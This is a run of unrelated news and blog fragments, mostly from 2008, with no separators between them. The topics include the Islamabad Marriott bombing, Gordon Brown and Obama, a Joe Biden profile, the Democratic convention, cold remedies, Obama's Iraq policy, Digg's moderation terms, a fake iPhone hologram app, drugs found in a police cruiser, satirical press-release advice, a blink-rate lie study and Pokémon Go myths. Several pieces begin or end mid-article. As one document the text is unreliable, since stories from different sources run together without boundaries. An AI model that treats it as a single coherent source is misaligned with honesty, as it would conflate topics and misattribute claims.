For the past four years , the Pakistani army has unsuccessfully tried both offenses and truces to bring peace to the tribal areas .
The United States has grown impatient and in recent weeks has launched its own air strikes and raids on Pakistani territory , straining relations with Pakistan 's new government .
Polls show that the U.S. war on terror is very unpopular with the Pakistani people , who would prefer to see the government make peace , not war , with pro-Taliban militants .
" The government has got to get the message across that this is our fight , " Ahmed said .
The Marriott attack came hours after new Pakistani President Asif Ali Zardari delivered a speech promising to get tough on terrorism – but also criticizing the U.S. cross -border attacks .
Zardari spoke to the country again a few hours after the attack .
" We will fight this menace .
We will not be frightened , " he said .
" We are a brave nation and should clean this cancer . "
The Associated Press also reported : • Leading newspapers in Pakistan urged the fledgling civilian government and the military today to craft a coherent policy against terrorism following the hotel bombing , no matter the reservations about America 's actions in Afghanistan or elsewhere , and despite the notion that the Marriott was targeted because it was a social magnet for foreigners .
" It is time we accepted this war is our own , " said a lengthy editorial in The News , one of the largest English language dailies in the country .
" There must be no ambiguity about this . "
Another leading daily , Dawn , said the country displayed a " distressing " lack of " visible direction , " and that " the civilians leaders and their uniformed counterparts must draw up a clear policy to fight terrorism . "
• Pakistan 's army and the U.S. military in Afghanistan said troops and tribesmen opened fire when two U.S. helicopters crossed into Pakistan from Afghanistan .
The two intelligence officials spoke on condition of anonymity today because they were not authorized to speak to media .
They cited field informants .
• British Airways has temporarily suspended flights to and from Pakistan amid security fears , airline spokesman Suhail Rehman said today .

Mr Brown has met both Mr Obama and Mr McCain this year Gordon Brown has rejected suggestions he endorsed Barack Obama 's US presidential candidacy in an article .
The prime minister , who praised the Democrat 's policies in the piece , said he had " admiration " for both Obama and his Republican rival , John McCain .
Mr Brown told a press conference it was for the American people to decide on their next president .
The Tories have said Mr Brown should explain the comments in his article and not be seen to be " taking sides " .
British prime ministers traditionally do not back one candidate over another .
' Great admirer '
In the article for The Monitor , a Parliamentary magazine , Mr Brown wrote of concerns about the housing slump , adding : " Around the world , it is progressive politicians who are grappling with these challenges .
" In the electrifying US presidential campaign , it is the Democrats who are generating the ideas to help people through more difficult times .
To help prevent people from losing their home , Barack Obama has proposed a Foreclosure Prevention Fund to increase emergency pre-foreclosure counselling , and help families facing repossession . "
He did not mention Mr McCain .
A responsible British prime minister needs to be ready to work with either presidential candidate after the US election , and should neither take sides nor be seen to be taking sides
William Hague
Shadow foreign secretary Asked about the comments at a press conference earlier , Mr Brown said : " The decision on the American election is a matter entirely for the American people and I have scrupulously met both Senator McCain and Senator Obama and talked to them both about the issue that affect our two countries and the future of global issues . "
He said he had met both in Washington and London and had enjoyed his conversations with them adding : " I'm a great admirer of both of these distinguished senators " and he was " proud " to know them both .
Shadow foreign secretary William Hague , for the Conservatives , said Mr Brown should not have written the comments .
He said : " A responsible British prime minister needs to be ready to work with either presidential candidate after the US election , and should neither take sides nor be seen to be taking sides .
" Gordon Brown needs to make clear why he appeared to be favouring the Democrats in this article and to explain whether this was his deliberate intention or a careless mistake . "
But Downing Street denied that Mr Brown was taking sides in the US election .
A spokesman said it was simply " an article written ahead of the party conferences in Britain " which " talks about some of the measures being taken around the world by centre - left political parties to deal with the current global economic challenges " .

BIDEN PROFILE BIDEN PROFILE Senator joins Dem ticket : Obama taps Biden as vice presidential running mate Analysis : Biden bolsters
Dem ticket on foreign policy , national security A blunt inquisitor : Foreign affairs is senator 's specialty Biden 's gaffes : Slips of the tongue have landed senator in hot water More on Biden : Complete coverage from the ' Delaware News Journal ' DENVER 
Maybe you did n't know that Joe Biden stuttered as a kid , takes a 91 - minute train ride home to his wife each night and is so well known in a must - win swing state he 's been called " Pennsylvania 's third senator . "
Barack Obama tapped as his running mate a man whose dramatic life story rivals his own , and holds political appeal far beyond the foreign - policy expertise that is Biden 's most obvious asset .
The Delaware senator balances this ticket in many other ways .
With his working - class background , Biden could help Obama fight his portrayal as a candidate of the elites , and win over the women voters who passionately supported Hillary Rodham Clinton .
He 's 65 years old to Obama 's 47 , Catholic to Obama 's Protestant .
Unlike Obama , he did n't attend Ivy League schools .
POLL : Biden well - liked , but unknown to many While Obama has frustrated some Democrats by being slow to attack , Biden is blunt and eager to wage political combat — qualities that could allow Obama to remain above the fray .
Biden , who overcame his stutter as a boy by relentless drills , is a gifted if sometimes windy speaker who goes for the gut .
" He 's comfortable on the attack and that will serve the ticket well , " says Rep. Artur Davis , D - Ala .
Biden also stays close to his roots — in his visits to his hometown of Scranton , Pa. , in the laws he works to pass and in the allies he 's made in Delaware politics .
When he returned last week from a trip to the embattled Republic of Georgia , for instance , he headed straight from the airport to a promised appearance at a firefighters hall .
In choosing Biden , Obama essentially is calculating that the Delaware senator 's penchant for occasional gaffes wo n't be a distraction in the fall campaign .
Biden was driven from the 1988 presidential race for failing to credit a British politician for a passage Biden used in a stump speech .
Biden has been lambasted more recently for clumsily praising Obama as " clean " and " articulate " and saying that in Delaware " you cannot go to a 7 - Eleven or a Dunkin ' Donuts unless you have a slight Indian accent . "
Hours after Obama made his pick , Republicans launched a " Biden gaffe clock . "
The same brain - to - mouth quickness that sometimes misfires , on the other hand , produced possibly the most memorable and cutting line of the primary season : Biden 's contention that every sentence uttered by former New York mayor Rudy Giuliani — at the time a candidate for the GOP nomination — was " a noun , a verb and 9/11 . "
Pennsylvania Gov. Ed Rendell , another Democrat whose bluntness sometimes gets him in trouble , cast Biden 's misfires as endearing .
" It 's pretty easy to fall in love with Joe Biden , " he told USA TODAY Sunday .
" Even his mistakes , you have a tendency to shake your head and say , ' But that 's Joe . ' " Another potential downside of Obama 's pick is one of the reasons he made it : the weight of Biden 's experience .
It 's reassuring to wavering voters worried about Obama 's short national resume .
But it could undercut Obama 's message of change .
Republicans have seized on that line of attack .
Minnesota Gov. Tim Pawlenty , a Republican often mentioned as a possible running mate for John McCain , on Sunday called Biden a " consummate insider " who was elected to the Senate when he and Obama were 11 .
" And he 's known as being long - winded on top of that , " Pawlenty added on a Republican party conference call .
" Where 's the change ? "
But Obama concluded the benefits outweigh the risks .
" Mostly , I think what attracted Sen. Obama was Biden 's wisdom , " senior strategist David Axelrod said on ABC's This Week .
" And not the kind of wisdom you get in Washington , D.C. , but the kind of wisdom you get when you overcome adversity , tragedy in your life as he has ; the kind of wisdom you get in the working - class communities of Scranton , Pa. , and Wilmington , Del . "
Tragedy struck early for Biden .
Shortly after he was elected to the Senate at age 29 , his wife and young daughter were killed in a car crash as they shopped for a Christmas tree ; his two young sons were badly injured .
In an emotional speech to the International Association of Fire Fighters last year , a shirt - sleeved Biden described his debt to his local firefighters .
" My firefighters saved my children , " he said .
In 1988 , Biden had a life - threatening aneurysm and local firefighters again raced to the rescue .
" I would not have lived " but for them , he told the group .
" We owe you big , " he said .
" You took care of me in the worst time of my life . "
Biden was persuaded to take office as planned in January 1973 and , with his sister helping him look after his sons during the day , commuted home to see his recovering little boys every night .
That set a pattern that has continued throughout his second marriage to Jill Jacobs in 1977 .
The older of his two sons , Beau , 39 , says that makes Joe Biden an outside - the Beltway candidate .
He became an Amtrak regular for more than three decades so he could " be home at my ballgames and be at the dinner table , " Beau Biden told USA TODAY last year .
Appeal to women
While Obama leads McCain 48 % - 42 % among women in a USA TODAY / Gallup Poll released Sunday , Biden 's family life and his legislative record on women 's issues could help win disappointed fans of Hillary Rodham Clinton and enlarge that gender gap .
Working Mother magazine said Sunday that Biden is one of 24 lawmakers on its " 2008 Best of Congress " list .
" He puts kids ' health , safety and education at the top of his priorities list , " the magazine said .
It said he has worked recently on a bill to reduce class size and " along with his wife , Jill , Biden has been a longtime leader in the fight against breast cancer . "
Biden supports abortion rights and , as a senior member and former chairman of the Senate Judiciary Committee , has helped block anti-abortion jurists .
Emily 's List president Ellen Malcolm , whose group supports female abortion - rights candidates , called Biden " a passionate advocate for women " whose " commitment to family will resonate with women voters across this country . "
When Biden was chairman of the Senate Judiciary Committee in 1991 , some feminists alleged that he was too easy on Supreme Court nominee Clarence Thomas and too hard on Anita Hill , a former co-worker of Thomas ' who had accused the federal judge of sexual harassment .
Three years later , however , Biden was praised by many feminists for what he calls one of his proudest accomplishments : writing the 1994 Violence Against Women Act.
Joseph Pika , a political scientist at the University of Delaware , says Biden was at least in part making amends .
" He very self - consciously tried to shore up his support from women voters after the Anita Hill episode , " he says .
Now , he says , Biden 's " respectful " treatment of Clinton could help Obama with Clinton supporters who have been reluctant to come on board .
Republicans , however , are doing what they can to stoke lingering resentments .
McCain has released a TV ad called " Passed Over , " lamenting that Clinton was not chosen as Obama 's running mate .
Giuliani , speaking on ABC's This Week , said Clinton should have been " a no- brainer " for Obama .
It 's unclear how many Clinton supporters remain offended .
One prominent Clinton ally , Florida Rep. Debbie Wasserman Schultz , 42 , switched to Obama right after the primaries and is even more enthusiastic now that Biden is on the ticket .
She says she has been " an admirer of him for forever , gaffes and all , " since her college days as a member of Students for Biden .
" I had the button on my backpack and the whole deal . "
Working class background
When Biden was named , Obama 's Pennsylvania office put out a release headlined " Obama selects Pennsylvania 's third senator . "
Delaware , south of Pennsylvania , is in the Philadelphia media market .
" People know him big time , and everything he does is reported by Philadelphia television , " Rendell says .
What 's more , Pennsylvania had Republican senators for 26 of the 30 years between 1977 and 2007 — prompting some elected Democrats to turn to Biden for help .
" He really handled Pennsylvania for us , " says Rep. Paul Kanjorski , who represents the Scranton and Wilkes - Barre areas .
The strongest tie is Biden 's abiding affection for Scranton , where he lived until he was 10 .
In the northeast corner of the state , Scranton is in the middle of swing - voter territory , home to working - class Catholic voters who in the Democratic primaries went solidly for Clinton .
Biden often invokes his blue - collar background with tales of his childhood playmates and uncles talking politics around the kitchen table , and he visits Scranton every year .
Last year , he took his 91 - year - old mother , Jean Finnegan , to visit the house where the family once lived .
" Scranton never leaves you ; it 's in your blood , " Biden said in an interview published Sunday by the Scranton Times - Tribune . " I do n't know , maybe I have a little romanticized view because I love the place so much . "
He said his mother , who lives with him , kissed him as he left for Springfield , Ill. , to be introduced as Obama 's running mate .
" Joey , everybody in Scranton 'll be so proud , " she told him .
The new USA TODAY / Gallup Poll shows Obama leading McCain 52 % - 36 % among registered voters making less than $ 50,000 a year .
But Biden could help him solidify his standing in crucial states where he lost working - class voters badly to Clinton .
In northeastern Pennsylvania , Obama lost to Clinton 3 to 1 .
Kanjorski , who backed Clinton , says he has been worried about " stabilizing " his region for Obama .
" Joe Biden goes 1,000 miles in that direction , " he says .
" He 's a favorite son . "
The Obama campaign is betting that Biden 's blue - collar appeal will extend throughout the Rust Belt , and some political analysts agree .
Alexander Lamis , a political scientist at Case Western Reserve University in Cleveland , says lower - income white voters will determine the election in those states .
" Biden helps , " he says .
" He 's plain - spoken and down - to - earth and will resonate in working - class areas . "
Student of the world As chairman of the Senate Foreign Relations Committee , Biden eases the minds of people who want seasoning along with change .
Pawlenty , in talking points also pressed by Giuliani and on a new GOP website called NotReady08.com , said Biden 's resume amounts to " overcompensation " for Obama 's " lack of readiness " to be president .
" It 's not a situation where you should have to have a mentor or a trainer or a superviser , " he said .
Biden himself had cited Obama 's inexperience during the primary campaign , but made light of that in his interview with the Scranton newspaper .
" Guess what , he got experienced real quick , " Biden joked , then added : " I was running against him , man .
What did they expect me to do , lean over and hug him and say , ' Yeah , he was the most experienced ?
He has plenty of experience ? '
Hey , man , the only thing I had going was experience . "
One state where his experience could make a difference is Florida , with its large contingent of Jewish voters .
Obama has rattled some Jewish voters because he is open to high - level dipomacy with Iran and because last year he told the American Israel Public Affairs Committee that " nobody is suffering more than the Palestinian people . "
Wasserman Schultz , who represents the Fort Lauderdale area , says Biden is viewed as a strong supporter of Israel and his presence on the ticket will " go a long way to winning over " Jewish voters .
She says she 's already been told Biden will campaign in Florida : " He has worked the condos .
I have worked the condos with Joe Biden before in my district .
People will be excited and fired up . "
If the choice of Biden works the way Obama hopes , winning the White House would raise a question that Biden himself has brought up :
Can he can adapt to working for someone else ?
Biden has been his own boss since he won an unexpected Senate victory in 1972 .
He has run his Senate office , the Senate Judiciary Committee and , now the Senate Foreign Relations Committee .
He has been set back on his heels personally and politically , but it has n't broken his faith in himself and his talents .
" One of the hardest things for Joe Biden , should they win , will be to stand silently by the President .
Vice presidents are seen but not heard , " Pika says .
" Verbal problems are probably controllable : He 'll stay on message .
( But ) I think playing second fiddle is going to be tough for him . "

One can only hope that someone had the foresight to hand out Obama / Biden ’08 tissue boxes on the floor of Denver ’s Pepsi Center .
Because between the cancer - stricken Sen. Edward M. Kennedy ’s surprising and heart - wrenching reassurances and Michelle Obama ’s graceful speech , the first night of the 2008 Democratic National Convention was punctuated as often by tears as it was by applause .
Even MSNBC ’s Chris Matthews seemed choked up , but James Carville on CNN shook his head over what he saw as a wasted evening that would have been better spent attacking Republicans .
But as any good dramatist knows , it ’s easier to rile a crowd that ’s been softened by righteous tears , and it would be difficult to find two people better suited to such a task than Kennedy and Michelle Obama .
The lone surviving son of the Democratic Party ’s royal family , Kennedy , with his still handsome face and silver hair , ignored his doctor ’s advice and traveled to Denver .
Rumors of his actually speaking fueled the pre-convention coverage , and after Ken Burns ’ poignant mini-doc , his familiar head appeared and everyone was on their feet .
He could have read the Denver phone book and the audience would have dissolved .

It was hard not to feel sorry for the Republicans ; Kennedy rallying the weeping troops -- who could top such a thing ?
And it was also hard not to wonder if somewhere in the bowels of the arena Michelle Obama was wondering pretty much the same thing .
That the next 45 minutes were filled with forgettable speakers and general pundit bloviating was , in fact , a wise use of dramatic pacing .
Because by the time Obama ’s moment arrived , everyone had caught their breath enough to begin weeping once again .
She asked voters to create a world that would allow them to say to their children : “ This time we listened to our hopes instead of our fears ; this time we decided to stop doubting and start dreaming ; we committed ourselves to building the world the way it should be . ”

Antihistamines can help , but there is a lot of disagreement on this and other remedies .
One thing really helps :
Wash your hands a lot so you do n't get a cold in the first place .

Most adults have two to four colds a year and children easily double that figure , surveys report .
Despite the name , colds are not caused by cold weather but by warm humans .
The only way to ensure that you never catch a cold virus , says Dr. Jack Gwaltney , Jr. , a cold specialist at the University of Virginia , is to " become a hermit . "

Here are some alternative solutions :
Wash your hands — a lot — and be aware that many people do not .
And use soap , which is more effective than alcohol - based hand sanitizers .
The key is to scrub well , for about 15 seconds .
Do n't rub your eyes and no Eskimo kisses , but go ahead and give your sniffling sweetie a smooch .
Cold viruses love eyes and noses but rarely leap mouth to mouth , says Gwaltney .
And if a peck on the lips improves your mood , it may do more good than harm .
Over-reacting
While a cold is a sign the body is battling an infection , many of the symptoms , such as congestion , are excessive methods of combat .
The effectiveness of Airborne , zinc and other treatments remain controversial , but , in general , cold treatments try to shorten or block these gratuitous attacks .
Gwaltney advises starting treatment at the first hint of a cold because " [ immune system ] pathways get ramped up very quickly , and once they get started , they are hard to slow down . "
He recommends taking first - generation antihistamines ( the older ones , like Dimetapp , which make you sleepy ) and an anti-inflammatory , such as ibuprofen , until all symptoms have stopped .
But there is a lot of disagreement on treatments .
The Mayo Clinic Women 's HealthSource recommends skipping antihistamines , which dry up nasal membranes and slow the mucus flow that helps rid your nasal passages of germs .
Decongestants help ease stuffiness , according to the Mayo Clinic .
They shrink swollen tissue inside the noses .
But decongestant sprays or drops can worsen congestion if used more than two or three days .
Chicken soup , along with just about any fluid , can be useful , as liquids help loosen the mucus that causes congestion .
Humidity can relieve congestion , too .
Just wait
Most treatments today address the cold symptoms , not the underlying infection .
The future in cold care may lie in a cocktail of anti-inflammatory , anti-histamine and anti-viral medications , said Gwaltney .
Anti-viral drugs are being tested but so far none are commercially available .
Creating a preventative vaccine , however , is less viable .
Rhinoviruses , the most common cause of the common cold , have more than 100 different varieties .
Acquiring immunity to one type does nothing to disarm the others .
Fortunately , says Gwaltney , each cold we battle makes us less susceptible to colds in general — enabling many people to grow old relatively sniffle - free .
On the downside , studies with mice suggest that frequent colds can , over a lifetime , aggravate memory loss .
WASHINGTON ( Reuters ) - Democrat Barack Obama ’s presidential campaign is signalling more flexibility on his pledge to quickly pull U.S. troops out of Iraq if elected as part of a move toward the political centre .
Obama ’s emerging shift of nuance on Iraq , the signature issue that helped him defeat Democrat rival Hillary Clinton to win his party ’s presidential nomination , comes as he prepares to make his first trip to Iraq .
The Illinois senator has repeatedly pledged to withdraw U.S. troops from Iraq , one brigade every month until all are out in 16 months .
Last September he argued , “ the best way to protect our security and to pressure Iraq ’s leaders to resolve their civil war is to immediately begin to remove our combat troops . ”
Aides say Obama is still committed to the 16 - month goal but they appear to be leaving him wiggle room now that the U.S. troop surge is credited with bringing some stability there .
Susan Rice , a top Obama foreign policy adviser , told MSNBC on Tuesday that “ we absolutely have to draw down and redeploy our forces from Iraq . ”
“ But he has said over and over again we have to be as careful getting out as George Bush was careless getting in .
So he will redeploy our forces responsibly , at a rate that our commanders say is safe and sustainable . ”
Letting commanders have a say in the pace of withdrawal is new language from the Obama campaign .
Anthony Lake , who was Democratic President Bill Clinton ’s national security adviser and now a senior Obama foreign policy adviser , told the Financial Times Obama would maintain a “ residual force for clearly defined missions ” in Iraq .
This would include military training and “ preparedness to go back in if there are specific acts of genocidal violence . ”
Lake compared the Iraq war to the conflict in Vietnam in citing the need to leave behind a functioning Iraqi government .
“ It is common sense that we could not leave Vietnam successfully unless we left behind a government in Saigon that could govern successfully , ” he told the newspaper , lamenting that this view was not obvious enough to many U.S. politicians at the time .
Obama recently has been shifting toward more moderate positions on several key issues -- Republicans call it politically expedient flip - flopping -- now that he has won his party ’s nomination and will face Republican John McCain in the November 4 election .
He abandoned a vow to reopen the North American Free Trade Agreement for renegotiations with Mexico and Canada , did not oppose a Supreme Court decision last week striking down Washington ’s gun ban and has said he would support expanding the government ’s wiretap authority .
LIBERALS TAKE NOTICE
The liberal left that helped propel Obama to the nomination is taking notice .
“ I can unequivocally say : the Obama campaign is making a very serious mistake , ” said Ariana Huffington , writing on the liberal Huffington Post blog .
“ Tacking to the centre is a losing strategy . ”
Republicans , however , are sceptical that Obama , once considered the most liberal senator in Washington , is really becoming a centrist .
“ Some of these things , he ’s trying to look centrist , ” said Republican strategist John Feehery .
“ But the fact is , he ’s going to go hard left . ”
McCain is a strong backer of current U.S. Iraq strategy .
He has repeatedly pounded Obama for never having met with the top U.S. commander in Iraq , Gen. David Petraeus , who is to report to Congress again this month on the effects of the troop surge ordered by President George W. Bush in early 2007 .
McCain has said he believes the Iraq war can be won by 2013 , leaving a functioning democracy there and allowing most U.S. troops to come home .
A Time magazine poll last week said McCain leads Obama on the Iraq issue 48 percent to 38 percent , although 56 percent said they would like to see troops brought home within the next two years .
By moderating his Iraq pledges , Obama risks angering liberals frustrated by the inability of Democrats to get U.S. troops out of Iraq since winning control of Congress in 2006 .
Democratic strategist Liz Chadderdon predicted Obama would talk less and less about a timeline for withdrawal but would not change his core position that U.S. troops must leave Iraq .
“ If Obama completely reversed on getting out of Iraq , I do think the base would walk away , ” she said .
“ I think he knows that and I think you ’ll never hear him say that . ”
But she said that in general , Democrats are willing to let Obama straddle some issues .
“ We want to go back into the White House .
And if that means we have to give him a longer leash on certain issues , we ’re going to give him a leash , ” she said .

The Digg Guy
After reading through an article about different Terms of Service , one which particularly highlighted Digg 's Terms of Use , and their " No Reason at All " clause , in which posts anc comments could be deleted by Digg moderators " for no reason at all , " I found myself thinking up possible reasons behind " not having any reason .
" What immediately came to mind was sponsorship .
A
Fox news show received attention when its hosts suddenly appeared with McDonald 's iced coffee drinks - which raised the question : how likely would Fox report an unrelated story against McDonald's , when McDonald 's had just payed a hefty sum of money to the network .
The article ( Handling executions in a Digg democracy ) lists occurences of comments being deleted - particularly ones which were against news host Katie Couric , at a time when Katie Couric and Digg had formed a partnership for interview questions .
Katie Couric , wanting users to submit questions for her to pose to politicians , received criticisms and negative comments which were promptly removed from the website , and the users in question were banned .
When some asked why , Digg pointed to their harassment clause , but also pointed out their " no reason at all " statement .
But is there ever really no reason at all ?
For actions to be dictated without reason suggest a few possibilities on Digg 's part : Digg has flawed code - an unknown bug , impossible to track down , which results in the spontaneous deletion of comments , and banning of account .
And while flawless code is rather impossible , it 's not likely that Digg would use this as the reason for their no-reason .
Moderators make a regular habit of randomly deleting data from the website 's database .
Reasons for which are completely unknown to all .
" No reason at all " is your typical umbrella clause to be brought into effect to cover points that were either missed , forgotten , or were not considered at the time of writing .
Moreover it also covers points in which embarassing admissions , admissions of fault , or any other form of admission .
And beyond that , it covers whatever else they would n't want to be telling us .
Such as , perhaps in the example given by the article , that Digg had just formed some quiet temporary partnership with CBS and Katie Couric , in which Digg had received a large cheque , and to maintain good relations and honor it 's relationship with CBS they quickly removed whatever could possibly be seen in a negative light .
I , for one , have no stake in any of this .
I just found the " No reason at all " clause to be somewhat peculiar .
For one , how could one argue that the actions they took were part of the " no reason at all " category of actions ?
If a legal matter were to arise , would this argument uphold in a court of law ?
" No reason at all " implies a randomness to me , and moreover implies that any search for a pattern would prove fruitless .
Like looking for a pattern in an irrational number , the moment one seems to arise , it would be immediately shattered .
Of course , to get philosophical about the idea of randomness , true randomness of an infinite array of digits could very have a pattern up until a certain digit - and if it so happens that that certain digit falls out of the range you are looking at - one would assume to have found a pattern .
And while not completely a different discussion than what I 'm arguing , it is not one likely to be solved in a single article .
The point remains that if one can show a motivation , a reason for actions - or , to prove by contradiction - prove that the actions could not have been random because there was nothing random about them - could this argument be hold ?
Does " No reason at all " not leave a door open to allow whatever reason is available to walk straight in and sit on the couch ?
And the more one affirms that the action had no reason , even ludicrous reasons seem the more plausible .
Of course in a court of law , and even outside it , the honus falls upon the accuser to prove the reason they are suggesting was the actual reason - and what could result is an argument so convoluted , so impossible to follow , it would just be a waste of time .
And yet , " No reason at all " remains an open door .
Open for those who want to form their own reasons to replace the lack of reason , and open for those like myself , who are dumbfounded by the inclusion of " no reason " .
Would not a reason such as " In certain rare instances , comments will be deleted for reasons that will not be divulged to the user except with the promise that this will not be a power abused , but one to provide and increase the reliability and quality of the product .
" At least with a reason like that , we 're given a reason , and though we may feel put off by the censorship , there is reassurance in knowing the censorship was founded on some rational , and not simply the outcome of an array of events , all set off by a butterfly flapping it 's wings in Chile .
Macenstein points us to an interesting video which claims to create a " holographic " effect on the iPhone by performing real time adjustments to the image based on rotation :
The application works by assuming a constant viewing angle ( 35 - 45 degrees ) , typical for when the device is placed on a tabletop .
The 3d scenes perspective is warped using anamorphosis , the same technique used in Hans Holbeins painting The Ambassadors .
This application does the exact same but updates dynamically .
Our only confusion is its apparent ability to detect rotational information on what appears to be a flat surface .
Of course , it 's possible that the demo was performed on an angled surface .
Update :
It 's not real :
" The iHologram app was not real .
It was an illustration of an idea I had which I believe could work with the technology ( combining anamorphosis and motion sensing ) .
Unfortunately
Im just an ideas person , I can show how things should look , but Im no hardcore programmer . "

A Burrillville town councilor got more than he bargained for when he bought a used police cruiser at auction .
Kevin Blais bought the 2004 Ford Crown Victoria in an online auction from the Hartford , Conn. , public works department .
He was cleaning it last week when he noticed a cracked area on the one - piece molded seat assembly .
When he removed the seat assembly to clean the floor , he found a plastic bag containing a substance that local police later confirmed was cocaine .
Blais speculates that a suspect stuffed the drugs through the crack to prevent police from finding them .
Burrillville Lt. Kevin San Antonio says Hartford police were " apologetic " when he told them of the discovery .
Hartford police spokeswoman Nancy Mulroy said Friday that based on their past experience with drug suspects , Blais ' speculation is almost certainly correct .
" It 's not unusual that perpetrators or suspects try to hide stuff in the cruisers before they go to booking , where they know they 'll be searched , " she said .

Any fool can write a good press release that hits its target audience and creates an impact .
Writing one that fails means work .
There are people who have mastered the art .
As an editor I ’ve seen some great efforts over the years .
I ’d like to share them with you .
Here are my top ten tips for making sure press releases get minimum attention :
1. Cripple its chances of reaching editors and journalists
Everyone can read plain text messages in the body of an email .
The message will almost certainly get through to any kind of desktop email clients , all flavours of web mail , as well as Blackberries , iPhones and Palm Pilots .
To reach less than 100 percent of your potential audience , try putting some of these clever barriers in the way .
Attachments are an effective way of cutting down the reach of your press release .
People reading email on mobile devices have trouble reading them .
Spam filters treat them with suspicion and if you ’re lucky the recipient may use Lotus Notes as a client and have difficulty decoding the attachment .
Another advantage of attachments is that you can trim your audience further by using difficult - to - open file formats : such as the new . docx file format used by Word 2007 – many journalists will struggle to read them .
Attachments are great for bulking up the size of your release so it wo n’t squeeze through email gateways .
If you ’re clever , use high - resolution logos in , say , your Word attachments .
These add nothing to the press release but can swiftly push the file size over the email gateway threshold .
A further reason for sending a press release as an attachment is its invisibility to email search .
So , when a journalist decides to look for your press release among the hundreds and thousands in their email in - box , it will be difficult to find .
2. Minimise relevance
One way to make sure your press release fails is to make sure it has no relevance to any sane audience .
For example , if you are a technology company and you buy a new fleet of cars you can squander your PR budget and make sure any future release goes directly to an editor ’s recycle bin by sending the story to the technology press .
3 . Send your press release out whenever
Timeliness is everything .
So send releases out when you feel like it to boost your chances of failure .
Better still , for print publications try waiting until five minutes after the final deadline .
For online publications wait until the story has already broken elsewhere .
Editors love that .
4 . Organise schedules so contacts are unavailable for interview
Good journalists are annoying creatures .
Rather than printing your press release verbatim and passing the contact details over to their advertising departments , they may want to speak to the people mentioned in your releases .
A tried and tested technique for avoiding these complications is to send the people overseas shortly after dispatching the release .
International communications are good these days , so just packing them off to a partner conference in Atlanta is n’t good enough , you need to make sure they are on an 18 hour trans - pacific flight or , better still , holidaying on a remote island .
5 . Use poor writing skills
Obvious when you think about it .
If your writing is poor and confused so that editors and journalists can’t understand your message you kill two birds with one stone .
First , you ’ll make sure the first message gets spiked in the too hard basket .
Second , as a bonus , you can establish your reputation as an illiterate idiot that is n’t worth bothering with under any circumstances .
That way , your future releases will go straight to the junk pile without even being read .
6 . Try bullying
Sadly this powerful technique is underused .
By threatening to talk to a journalist ’s editor , or an editor ’s boss about their poor response to your press release you can permanently undermine your relationship with scores of people ( remember journalists talk to each other so this is an efficient way of burning lots of bridges ) .
Another approach is to tell the journalist the company in question is advertising thus triggering their professional editorial independence .
7 . Do n’t bother with press release photographs
Journalists and editors like photographs .
They love good photographs .
By making sure they are no photographs of any description you ’ll increase the chances that your press release is regarded as useless .
If you think that ’s taking things too far , try sending out crappy , unusable photos .
Photos with dozens of un - named people work well in this respect .
Getting people to hold champagne glasses , stand in front of company logos , gather around an unreadable normal - size bank cheque or impersonate public enemy number one mug shots are all effective techniques for creating instantly ignorable press release photographs .
8 . Send it to everyone regardless
This is a great way to upset journalists and degrade both your personal and company reputation .
At the same time if you work for a PR agency you can bill the client heaps for having a , er , comprehensive , mailing list and then bill them for time as you and your staff spend all day on the phone dealing with angry editors .
9 . Keep your press release as dull as possible
Journalists prefer interesting stories .
Public relations professionals recognise this and use clever tricks like passive sentences , boring ideas , irrelevant background facts , tired clichéd adjectives and implausible anodyne quotes to turn them off and help speed their press releases on their way to the great recycle bin in the sky .
In - house and government public relations people are usually better at delivering boring releases than agency staff – if you ’re worried your writing sparkles too much , they have much to teach you .
10 .
Make sure the subject line obscures the message
Even experienced public relations operatives can slip up by giving an email release an interesting subject line .
The danger is that after putting in all the hard work required to guarantee nobody takes the slightest notice of their press release they use active language to put a relevant , timely subject line message that tempts editors and journalists to open the document and read more .
The good news is there are fail - safe subject lines that are certain to turn off editors and journalists so they can just skip past your release .
A classic subject line like press release will probably work , if that ’s too simple try important press release or important press release from Company Name .
A neat by - product of badly written subject lines is they can fool spam detection engines into rejecting a message altogether ; phrases like important announcement from Company Name or message for Clark Kent can come in handy here .

How do you spot a lie ?
It 's all to do with the ' blinking ' obvious ...
Clinton denied that he had an affair with White House intern Monica Lewinksy - but did his blinking betray him ?
If you want to know if someone is telling the truth , keep an eye on the eyes .
Liars blink in different ways during and after a falsehood , researchers claim .
They blink less than normal during the lie , and then have a flurry up to eight times faster than usual afterwards .
' It is striking what different patterns in eye blinks emerged for liars and truth tellers , ' said Dr Sharon Leal , co-author of the study at Portsmouth University .
' Such striking differences in behaviour between liars and truth tellers are rarely seen in deception research . '
The psychologists say that the discovery , reported in the Journal of Non-verbal Behaviour , means that blink rates could be used by professionals to catch liars .
In the study , a group of volunteers were told to go about their normal business for ten minutes but not to do anything that they might later have to lie about .
A second group were asked to steal an exam paper from an office , then to deny having taken it .
Experimenters , unaware of which group each individual was attached to , then asked each to recall exactly what they had been doing .
While they were being asked questions , their blink rates , which had all been the same at the start , were monitored with electrodes placed above and below and at the sides of the eyes to monitor all movements .
Results show that when the questions were being asked and the answers given , the blink rate in the liars went down .
The truth tellers ' rate went up , possibly because of test anxiety .
Afterwards , the blink rate of the liars increased rapidly in a sudden flurry of activity , while that of the truth tellers remained the same .
The researchers say that the increased mental effort involved in telling fibs could be the reason why liars do not blink during the act of lying .
Dr Leal said : ' Liars must need to make up their stories and must monitor their fabrication so that they are plausible and adhere to everything the observer knows or might find out .
' In addition , liars must remember their earlier statements , so that they appear consistent when re-telling their story , and know what they told to whom .
Liars will be more inclined than truth tellers to monitor and control their demeanour so they will appear honest .
' The reasons why there is a flurry of blinks after the lie is not really clear .
It may be that this flurry is a kind of safety valve , like a release of energy after the tension of lying . '

Go is very popular among players , gathering millions of users who regularly engage in all the events or the activities released by Niantic Labs .
They love the game , they love sharing their achievements and tips or tricks in the game community or on social media .
There were some tricks which actually worked and some which were proven to be myths .
The trick we ’re going to talk about is the one where you do n’t press okay when catching a raid boss .
But one of the officials from Niantic Labs has said that the trick does n’t work .
According to NianticGeorge the trick Do n’t Press
Okay is actually a myth .
He responded to this exact trick when he saw that almost half of the Pokémon
Go players believe that the trick works .
How did the Don’t - Press - Okay Trick Got Famous ?
Earlier last month there were some reports according to which if players would n’t press okay to catch a raid boss they will make other players from their raid group to get a higher chance rate bonus .
There was a post stating that the trick does n’t work .
Other Myths in Pokémon Go
Even though they are considered myths , there are way too many players to get a hold on correct information .
One way to clear any misunderstandings would be to get some information regularly released by Niantic Labs .
There have been some myths that turned out to be true .
Here are those real myths : the Last Ball glitch which was very disputed by players and ended up being there and repaired by the developers by giving players in raid battles an extra Premier Ball .

